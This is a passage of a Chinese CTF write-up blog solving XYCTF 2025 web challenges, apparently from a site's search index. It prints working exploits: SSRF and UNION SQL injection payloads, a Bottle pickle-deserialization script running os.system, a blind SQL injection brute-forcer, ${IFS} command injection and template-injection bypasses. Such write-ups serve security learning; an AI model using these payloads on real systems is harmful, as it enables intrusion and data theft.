class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> found[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">print</span>(flask.request.remote_addr)<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/1337&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_search</span>():<br>    <span class="hljs-keyword">if</span> flask.request.remote_addr == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        code = flask.request.args.get(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">if</span> code == <span class="hljs-string">&#x27;abcdefghi&#x27;</span>:<br>            req = flask.request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                req = binary_to_string(req)<br>                <span class="hljs-built_in">print</span>(req)<br>                req = json.loads(req) <span class="hljs-comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br>            <span class="hljs-keyword">except</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Empty Person&#x27;s name&quot;</span>)<br><br>            name = req[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">6</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Too long&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO &#x27;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;)&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO )&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            Some waf hidden here ;)</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br><br>            fate = db_search(name)<br>            <span class="hljs-keyword">if</span> fate <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flask.abort(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;No such Person&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;Fate&#x27;</span>: fate&#125;<br>        <span class="hljs-keyword">else</span>:<br>            flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Hello local, and hello hacker&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Only local access allowed&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>关键路由</strong></p><p>1、&#x2F;proxy：获取用户请求中的url参数，将其拼接到<a href="http://lamentxu.top/">http://lamentxu.top</a> 后面，检查后通过requests.get发出请求，并返回响应内容（打ssrf）</p><p>2、&#x2F;1337：接受本地请求，简单检查后执行数据库查询操作（打sql注入）</p><p><strong>先是ssrf</strong></p><p>源码在目标url前加了一个域名lamentxu.top，加一个@跳到自定义的url</p><p>禁用了所有字母和“.”，可以用十进制表示IPV4地址（点分十进制：127.0.0.1，二进制：0111 1111 0000 0000 0000 0000 0000 0001，十进制：2130706433），或者用0绕过（linux中访问0会解析为127.0.0.1）</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337</p></blockquote><p><strong>然后绕过&#x2F;1337路由下的检查</strong></p><p>首先传入的参数0需要等于“abcdefghi”，但是代理网页禁用了所有字母，可以用二次url编码绕过</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39</p></blockquote><p>然后去构造参数1，参数1会经过一个binary_to_string()函数，将二进制转为一个字符串，这里按照binary_to_string()去写一个stirng_to_binary()函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_binary</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;将可读文本转换为二进制字符串&#x27;&#x27;&#x27;</span><br>    binary_list = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text]<br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(binary_list)<br>    <span class="hljs-keyword">return</span> binary_string<br></code></pre></td></tr></table></figure><p>接下来进行长度绕过，<strong>len()函数对字符串会统计其字符的个数，而对元组、列表和字典只会统计其元素的个数</strong>，这里限制了元组和列表，使用字典绕过</p><p><strong>最后打sql注入</strong></p><p>init_db.py中有提示，可以直接查···WHERE NAME &#x3D; ‘LAMENTXU’</p><p>先用)))))))去闭合前面的upper()函数，再union进行联合注入</p><p>构造的json</p><blockquote><p>original_text &#x3D; ‘’’{“name”: {“‘))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME&#x3D;’LAMENTXU’ –”: 1}}’’’</p></blockquote><p>利用string_to_binary()转成二进制，最终payload</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%261&#x3D;0111101100100010011011100110000101101101011001010010001000111010001000000111101100100010001001110010100100101001001010010010100100101001001010010010100100100000010101010100111001001001010011110100111000100000010100110100010101001100010001010100001101010100001000000100011001000001010101000100010100100000010001100101001001001111010011010010000001000110010000010101010001000101010101000100000101000010010011000100010100100000010101110100100001000101010100100100010100100000010011100100000101001101010001010011110100100111010011000100000101001101010001010100111001010100010110000101010100100111001000000010110100101101001000100011101000100000001100010111110101111101</p></blockquote><p>bp打</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/fate.png"></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    secret = f.read()<br><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><strong>关键路由</strong></p><p>1、&#x2F;download：可以读取任意文件，但限制了目录穿越</p><p>2、&#x2F;secret：进行用户验证（调用了get_cookie()，get_cookie()中有一段代码是将base64解码后进行反序列化，拿到secret即可进行反序列化）</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin1.png"></p><p><strong>先拿secret</strong></p><p>通过.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt，绕过限制进行目录穿越拿secret</p><blockquote><p>payload：download&#x2F;filename&#x3D;.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt</p><p>secret：Hell0_H@cker_Y0u_A3r_Sm@r7</p></blockquote><p><strong>打pickle反序列化</strong></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20154/secret&quot;</span><br>secret = <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./flag.txt&#x27;)&quot;</span>,))<br><br>name = cookie_encode(<br>    (<span class="hljs-string">&#x27;session&#x27;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>: [Test()]&#125;),<br>    secret<br>)<br><br><span class="hljs-comment">#print(name.decode())</span><br><br>requests.get(url, cookies=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: name.decode()&#125;)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin2.png"></p><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>禁用了鼠标和键盘，更多工具中打开开发者工具，发现有反调试，右键选择“向忽略列表添加脚本”，虽然无法调试但并没有什么影响</p><p>题目说要是能在2秒内解决这个puzzl，就给flag，与时间有关，在源码中检索关键词time，发现startTime和endTime，估计flag的弹窗条件为endTime-startTime &lt; 2，通过控制台赋一个较大值给startTime，如startTime &#x3D; 10000000000</p><p>然后完成拼图即可</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/puzzl1.png"></p><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>提示有sql注入，通过尝试确定username为注入点</p><p>尝试用万能密码’or(1&#x3D;1)#</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/ezsql1.png"></p><p>还有一层需要输入密钥，利用布尔盲注</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20185/login.php&quot;</span><br>secret = <span class="hljs-string">&quot;&quot;</span><br>char_set = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> char_set:<br>        <br>        <span class="hljs-comment">#爆库名</span><br>        <span class="hljs-comment">#payload =  f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#爆表名</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#)&quot;</span><br><br>        <span class="hljs-comment">#爆列名</span><br>        <span class="hljs-comment">#payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)from\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><br>        <span class="hljs-comment">#爆字段</span><br>        payload = <span class="hljs-string">f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)from\tdouble_check)from(<span class="hljs-subst">&#123;i&#125;</span>)for(1))=&#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27;#&quot;</span><br><br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>: payload, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span>&#125;<br><br>        res = requests.post(url=url, data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;目前由于系统恶意登录尝试请求过多,现已开启双重认证机制,请输入管理员账户的秘钥&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            secret += j<br>            <span class="hljs-built_in">print</span>(secret)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><blockquote><p>secret：dtfrtkcc0czkoua9s</p></blockquote><p>命令执行无回显并将空格禁用，利用${IFS}绕过和&gt;重定向</p><blockquote><p>cat${IFS}&#x2F;f*${IFS}&gt;flag.txt</p></blockquote><p>再访问&#x2F;flag.txt即可</p><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;open&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>明显的bottle模板注入，但限制了长度并禁用了open和\</p><p>可以用latin-1绕过对open的禁用（但似乎只有少数字符在在部分情况下才会被正确解析为对应的ascii码，参考博客：<a href="https://www.cnblogs.com/LAMENTXU/articles/18805019%EF%BC%89">https://www.cnblogs.com/LAMENTXU/articles/18805019）</a></p><blockquote><p>Latin-1编码，也称为ISO-8859-1，是一种单字节字符集，它扩展了ASCII编码以包括西欧语言的字符。Latin-1编码的范围是0x00-0xFF，其中0x00-0x7F之间的编码与ASCII完全一致，而0x80-0xFF之间则包含了控制字符和文字符号。这种编码方式在支持Latin-1的系统中传输和存储其他任何编码的字节流时，不会丢失信息，这使得它在某些数据库系统中，如MySQL中被默认使用。在处理Latin-1编码时，需要注意的是，尽管它兼容ASCII编码，但它并不支持所有语言的字符。</p></blockquote><p>将o替换成%ba即可</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload：/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy1.png"></p><p>也可以用bottle的模板语法，将payload字符逐个注入，绕过长度限制，然后执行</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20187/attack&quot;</span><br>payload = <span class="hljs-string">f&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f* &gt; hah&#x27;)&quot;</span><br><br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a+=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>    r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: tmp&#125;)<br><br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%include(&#x27;hah&#x27;)&quot;</span>&#125;).text<br><br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯"></a>出题人又疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> , <span class="hljs-string">&#x27;read&#x27;</span><br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>较上一题，将read及其一些其他字符禁用</p><p>继续利用latin-1绕过</p><p>将o替换成%ba，将a替换成%aa</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload：/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy_again.png"></p><p>参考博客：</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18730353">https://www.cnblogs.com/LAMENTXU/articles/18730353</a></p><p><a href="https://blog.csdn.net/oyf3085227433/article/details/147075769">https://blog.csdn.net/oyf3085227433/article/details/147075769</a></p><p><a href="https://www.cnblogs.com/ddd-flag/articles/18816057">https://www.cnblogs.com/ddd-flag/articles/18816057</a></p><p><a href="https://www.mcso.top/all/">https://www.mcso.top/all/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
